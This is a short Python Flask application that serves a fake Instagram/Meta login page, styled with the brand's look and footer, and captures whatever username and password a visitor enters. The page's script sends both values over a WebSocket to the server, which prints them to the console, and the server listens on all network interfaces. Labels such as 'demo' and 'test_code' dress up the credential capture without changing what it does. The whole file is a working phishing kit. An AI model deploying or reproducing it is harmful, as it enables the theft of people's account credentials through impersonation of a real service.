
from flask import Flask, request, render_template_string
from flask_sock import Sock
import json

app = Flask(__name__)
sock = Sock(app)

clients = []

HTML = """


<!DOCTYPE html>
<html>
<body class="body">
<center>
English (UK)
<br><br><br><br><br>
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHlopO-s7goTS5F-0Z1Wgbana3XJk0uQsm0Q&s" class="logo"></div>
<br><br><br><br><br><input id="username" class="user" placeholder="username, email address or mobil number">
<br><br><input id="password" class="user" placeholder="Password">
<br><br><button onclick="send()" class="btn">Log in</button>
<p>Forgotten password?</p><br><br><br><br><br><br><br><br><p style="color:#777;">meta instagram</p>
<p id="status" style="color:#000;"></p>

<style type="text/css">


.body {   background:#000;  color:#fff;    }
.logo {  
width:100px;height:100px;    }
.user {  width:80%; height:50px; background:none; border:2px solid #555; border-radius:10px; color:#fff;   }

.btn { color:#fff;

background:#0064E0; border:none; width:80%; height:37px;border-radius:13px; 



}


</style>
<script>
let ws = new WebSocket(
 "ws://" + location.host + "/live"
);

function send(){
 let data = {
  username:document.getElementById("username").value,
  test_code:document.getElementById("password").value
 };

 ws.send(JSON.stringify(data));
 document.getElementById("status").innerText =
 "Demo data sent!";
}
</script>


</body>
</html>


"""

@app.route("/")
def home():
    return render_template_string(HTML)

@sock.route("/live")
def live(ws):
    clients.append(ws)
    print("[CONNECTED] Demo client")

    try:
        while True:
            data = ws.receive()
            if data is None:
                break

            obj = json.loads(data)

            print("\n--- DEMO INPUT ---")
            print("Username:", obj.get("username"))
            print("Test code:", obj.get("test_code"))

    finally:
        if ws in clients:
            clients.remove(ws)
        print("[DISCONNECTED]")

app.run(host="0.0.0.0", port=9000)